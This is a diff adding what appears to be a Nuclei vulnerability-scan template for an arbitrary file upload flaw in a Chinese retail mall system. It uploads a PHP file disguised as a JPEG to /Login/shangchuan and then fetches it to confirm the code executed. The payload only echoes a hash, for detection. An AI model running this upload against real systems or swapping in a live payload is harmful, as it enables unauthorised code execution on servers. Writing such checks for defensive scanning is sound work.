@@ -1,0 +1,56 @@
+id: poc-yaml-chuangke-shangchuan-anyfile-upload
+info:
+  name: 创客零售商城系统 shangchuan 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+  datetime: "{{date_time('2006-01-02')}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Login/shangchuan"
+    headers:
+      Content-Type: "multipart/form-data; boundary=---------------------------414826822120315253603069971739"
+    body: |-
+      -----------------------------414826822120315253603069971739
+      Content-Disposition: form-data; name="file"; filename="1.php"
+      Content-Type: image/jpeg
+
+      <?php echo md5({{t1}});?>
+      -----------------------------414826822120315253603069971739--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ".php"
+        part: body
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        part: body
+        regex:
+          - "([0-9]+)\\.php"
+
+  - id: validate-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/Uploads/txt/{{datetime}}/{{file}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
